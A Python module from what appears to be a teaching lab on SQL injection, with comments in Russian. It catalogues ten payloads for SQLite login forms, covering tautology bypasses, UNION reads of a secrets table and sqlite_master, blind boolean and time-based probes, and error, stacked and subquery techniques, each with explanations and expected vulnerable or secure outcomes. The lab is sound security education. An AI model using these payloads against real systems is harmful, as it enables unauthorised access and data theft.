"""Каталог демонстрационных техник SQL Injection.

Единый источник правды: один и тот же список используется

* интерфейсом (кнопки «пробросить payload»);
* тестами (каждый payload обязан вести себя как заявлено);
* документацией (``docs/PAYLOADS.md``).

Поэтому менять набор техник нужно здесь — и больше нигде.
"""

# Каждая техника описывает, что именно должно произойти в каждом из двух
# режимов лаборатории. Значения ``expected_*`` проверяются тестами.
PAYLOADS = [
    {
        "id": "classic_or_bypass",
        "title": "Классический обход: ' OR '1'='1' --",
        "technique": "Tautology",
        "severity": "critical",
        "username": "student' OR '1'='1' --",
        "password": "anything",
        "expected_vulnerable": "bypass",
        "expected_secure": "blocked",
        "summary": "Кавычка закрывает строковый литерал, условие OR делает предикат истинным всегда, а комментарий отсекает проверку пароля.",
        "why": "Вход выполняется, хотя пароль «anything» неверный. Возвращаются все пользователи базы.",
        "notes": [
            "Классика, которую чаще всего используют на практике.",
            "Работает в любой СУБД, где поддерживается построчный комментарий.",
        ],
    },
    {
        "id": "or_block_comment",
        "title": "Блочный комментарий: ' OR 1=1 /*",
        "username": "' OR 1=1 /*",
        "password": "x",
        "technique": "Tautology",
        "severity": "critical",
        "expected_vulnerable": "bypass",
        "expected_secure": "blocked",
        "summary": "Вариант с блочным комментарием /* … */ вместо построчного --.",
        "why": "Открывающий /* отсекает остаток запроса до конца строки, поэтому незакрытая кавычка не мешает выполнению.",
        "notes": [
            "В SQLite поддерживаются оба вида комментариев: -- и /* */.",
            "Символ # в SQLite не является комментарием — это специфика MySQL.",
        ],
    },
    {
        "id": "or_no_comment",
        "title": "Обход без комментария: ' OR '1'='1",
        "username": "' OR '1'='1",
        "password": "x' OR '1'='1",
        "technique": "Tautology",
        "severity": "high",
        "expected_vulnerable": "bypass",
        "expected_secure": "blocked",
        "summary": "Кавычка закрывает литерал, но в поле пароля остаётся закрывающая кавычка, которая балансирует условие.",
        "why": "Показано, что закрывать нужно обе части запроса — иначе синтаксическая ошибка.",
        "notes": [
            "Частая ошибка новичков: забыть про второе поле.",
        ],
    },
    {
        "id": "union_secrets",
        "title": "Кража secrets через UNION SELECT",
        "technique": "UNION-based",
        "severity": "critical",
        "username": "' UNION SELECT id, owner, content FROM secrets --",
        "password": "x",
        "expected_vulnerable": "leak",
        "expected_secure": "blocked",
        "summary": "UNION присоединяет вторую выборку из таблицы secrets. Число колонок совпадает (три), поэтому подстановка проходит.",
        "why": "Вместо role в таблице оказывается содержимое секрета — учебный флаг.",
        "notes": [
            "Требует знать количество и порядок колонок исходного SELECT.",
            "Именно так атакующий выясняет структуру таблиц.",
        ],
    },
    {
        "id": "union_schema",
        "title": "Раскрытие схемы: sqlite_master",
        "technique": "UNION-based",
        "severity": "high",
        "username": "' UNION SELECT 1, name, sql FROM sqlite_master --",
        "password": "x",
        "expected_vulnerable": "schema",
        "expected_secure": "blocked",
        "summary": "Через UNION читается служебная таблица sqlite_master: имена всех таблиц и текст их определений.",
        "why": "Видно, как выглядит разведка: сначала структура, потом данные.",
        "notes": [
            "В sqlite_master нет колонки id — вместо неё подставляется литерал 1.",
            "Аналог: information_schema в MySQL, pg_catalog в PostgreSQL.",
        ],
    },
    {
        "id": "boolean_blind",
        "title": "Boolean blind: проверка первого символа",
        "technique": "Blind (boolean)",
        "severity": "high",
        "username": "' OR SUBSTR((SELECT content FROM secrets LIMIT 1),1,1)='F' --",
        "password": "x",
        "expected_vulnerable": "signal",
        "expected_secure": "blocked",
        "summary": "Проверяется, начинается ли секрет с символа F. Ответ true/false — это один бит информации.",
        "why": "Данные не возвращаются напрямую, но по одному биту за запрос можно восстановить значение целиком.",
        "notes": [
            "Настоящий blind — медленный, зато работает, когда вывод данных запрещён.",
            "Кнопка «Авто-извлечение флага» в интерфейсе делает именно такой перебор.",
        ],
    },
    {
        "id": "time_based",
        "title": "Time-based: randomblob в условии",
        "technique": "Blind (time)",
        "severity": "high",
        "username": "student' AND length(randomblob(20000000)) > 0 --",
        "password": "x",
        "expected_vulnerable": "delay",
        "expected_secure": "blocked",
        "summary": "Условие всегда истинно, но заставляет СУБД сгенерировать 20 МБ случайных данных — ответ заметно замедляется.",
        "why": "В SQLite нет SLEEP(), поэтому нагрузка эмулируется генерацией данных. В MySQL тот же эффект дал бы SLEEP(5).",
        "notes": [
            "SQLite вычисляет AND коротким замыканием: если левая часть ложна, правая не вычисляется. Поэтому перед randomblob стоит заведомо истинное условие.",
            "Замер идёт по времени выполнения запроса.",
            "Лаборатория ограничивает объём нагрузки, чтобы не подвисать во время защиты.",
        ],
    },
    {
        "id": "error_based",
        "title": "Error-based: незакрытая кавычка",
        "technique": "Error-based",
        "severity": "medium",
        "username": "oops'",
        "password": "x",
        "expected_vulnerable": "error",
        "expected_secure": "blocked",
        "summary": "Лишняя кавычка ломает синтаксис, и текст ошибки СУБД попадает в ответ приложения.",
        "why": "В уязвимом режиме ошибка раскрывается пользователю целиком, в защищённом — заменяется нейтральным сообщением.",
        "notes": [
            "Утечка деталей ошибок сама по себе — отдельная уязвимость.",
        ],
    },
    {
        "id": "stacked_query",
        "title": "Stacked query: попытка второго оператора",
        "technique": "Stacked queries",
        "severity": "medium",
        "username": "'; SELECT * FROM secrets --",
        "password": "x",
        "expected_vulnerable": "error",
        "expected_secure": "blocked",
        "summary": "После точки с запятой атакующий пытается выполнить дополнительный оператор.",
        "why": "Драйвер sqlite3 выполняет только один оператор за вызов и блокирует попытку — это часть защиты.",
        "notes": [
            "В других драйверах и СУБД stacked queries иногда проходят.",
        ],
    },
    {
        "id": "subquery_probe",
        "title": "Проверка логина через подзапрос",
        "technique": "Subquery",
        "severity": "high",
        "username": "' OR username=(SELECT username FROM users LIMIT 1) --",
        "password": "x",
        "expected_vulnerable": "signal",
        "expected_secure": "blocked",
        "summary": "В условие подставляется подзапрос, который возвращает логин первого пользователя.",
        "why": "Проверяется не пароль, а сам факт существования учётной записи.",
        "notes": [
            "Показывает, что подзапросы — самостоятельный вектор атаки.",
        ],
    },
]

# Ожидаемые исходы в уязвимом режиме.
EXPECTED_OUTCOMES = {
    "bypass": "Вход выполнен при неверном пароле (авторизация обойдена).",
    "leak": "В ответе видны данные, которых не должно быть в выдаче.",
    "schema": "Раскрыта структура базы: имена таблиц и текст их определений.",
    "signal": "Ответ отличается от обычного отказа — найден канал утечки.",
    "delay": "Запрос выполняется заметно дольше обычного.",
    "error": "Приложение возвращает подробности ошибки SQL.",
    "blocked": "Попытка не удалась: ввод обработан как обычное значение.",
}


def by_id(payload_id):
    """Найти технику по идентификатору."""
    for p in PAYLOADS:
        if p["id"] == payload_id:
            return p
    return None


def public_catalog():
    """Каталог в виде, пригодном для отдачи в API (без внутренних полей)."""
    result = []
    for p in PAYLOADS:
        item = dict(p)
        item["expected_description"] = EXPECTED_OUTCOMES.get(
            p["expected_vulnerable"], ""
        )
        result.append(item)
    return result
